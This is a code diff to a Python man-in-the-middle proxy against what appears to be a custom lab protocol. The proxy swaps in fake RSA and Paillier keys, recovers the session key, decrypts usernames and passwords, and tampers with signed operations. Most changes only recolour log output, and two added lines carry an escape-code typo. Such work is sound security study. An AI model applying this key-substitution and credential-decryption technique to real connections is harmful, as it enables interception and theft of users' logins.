@@ -41,7 +41,7 @@ while True:
     # Assume this is always on a request-response protocol
     while True:
         req = client_conn.recv(4096)
-        print(f"Request: {req}")
+        print(f"\x1b[2mRequest: {req}\x1b[0m")
         if req == b'exit':
             server_conn.send(req)
             break
@@ -63,13 +63,13 @@ while True:
                                    + repr(bitset.from_number(client_nonce)))
             session_key = session_key << (
                 8 - len(format(session_key, 'b')) % 8)
-            print(f"+++ SESSION KEY RETRIEVED: {session_key}")
+            print(f"\x1b[1mSESSION KEY RETRIEVED: {session_key}\x1b[0m")
             # for now, ignore the paillier and let that go. but we can mitm that too.
             rsaPow, rsaCipher = rsa.encrypt(real_rsa_keys[1], real_rsa_keys[0],
                                             premastersecret)
             req_obj["data"] = f"{rsaPow}:{rsaCipher}"
             req = json.dumps(req_obj).encode()
-            print(f"Altered: {req}")
+            print(f"\x1b[2mAltered (same ptxt): {req}\x1b[0m")
         elif req_obj["id"] == 2:
             op = packet.Operation.parse_obj(req_obj)
             k_bitset = bitset.from_number(session_key)
@@ -79,11 +79,11 @@ while True:
                 op, session_key, session_key)
             if p_op.id == packet.ProtectedOperationIds.VERIFY:
                 subcontent = rc5.decrypt(k_bitset, p_op.data)
-                print(f"+++ Double-Decrypted USERNAME/PASSWORD: {subcontent}")
+                print(f"\x1b[1mDouble-Decrypted USERNAME/PASSWORD: {subcontent}\x1b[0m")
             elif p_op.id == packet.ProtectedOperationIds.CHALLENGE:
                 subcontent: dict = json.loads(p_op.data)
                 client_rsa_keys = subcontent["keys"]
-                print(f"Client public keys: {client_rsa_keys}")
+                print(f"\x1b[1mClient public keys: {client_rsa_keys}\x1b[0m")
             data = p_op.data
             value = p_op.value
             # make any changes we want to data & value
@@ -132,7 +132,7 @@ while True:
                 new_op.signature = (op.signature[0], H_r ^ new_hash)
             req = new_op.json().encode()
             if new_op != op:
-                print(f"Altered: {req}")
+                print(f"\x1b[2mAltered: {req}\x1b[0m")
         else:
             assert False
         # Alter the request here
@@ -145,21 +145,25 @@ while True:
             continue
 
         resp = server_conn.recv(4096)
-        print(f"Response: {resp}")
+        print(f"\x1b[2mResponse: {resp}\x1b[0m")
         if req_obj["id"] == 0:
             _, server_nonce, _, _, _, cert = resp.decode().split("|")
             server_nonce = int(server_nonce)
             _, n, e = cert.split(":")
             real_rsa_keys = (int(n), int(e))
+            print(f"\x1b[1mServer RSA Keys: {real_rsa_keys}\x1b[0m")
 
             resp = f"1.3|{server_nonce}|{sessionID}|RC5:SHA-1:stream:F:20|SHA-1|Certificate:{fake_rsa_keys[0]}:{fake_rsa_keys[3]}".encode(
             )
+            print(f"\x1b[1mFake Server RSA Keys: {fake_rsa_keys[0]}:{fake_rsa_keys[3]}\x1b[0m")
+            print(f"\x2b[2mAltered: {resp}\x1b[0m")
         elif req_obj["id"] == 1:
             n, g = resp.decode().split("|")
             real_paillier_keys = (int(n), int(g))
+            print(f"\x1b[1mServer Paillier Keys: {real_paillier_keys}\x1b[0m")
             resp = f"{fake_paillier_keys[0]*fake_paillier_keys[1]}|{fake_paillier_keys[3]}".encode()
-            print(f"Altered: {resp}")
-            # Can't do this because of client signature
+            print(f"\x1b[1mFake Paillier Keys: {resp}\x1b[0m")
+            print(f"\x2b[2mAltered: {resp}\x1b[0m")
         elif req_obj["id"] == 2:
             resp_obj = json.loads(resp)
             op = packet.Operation.parse_obj(resp_obj)
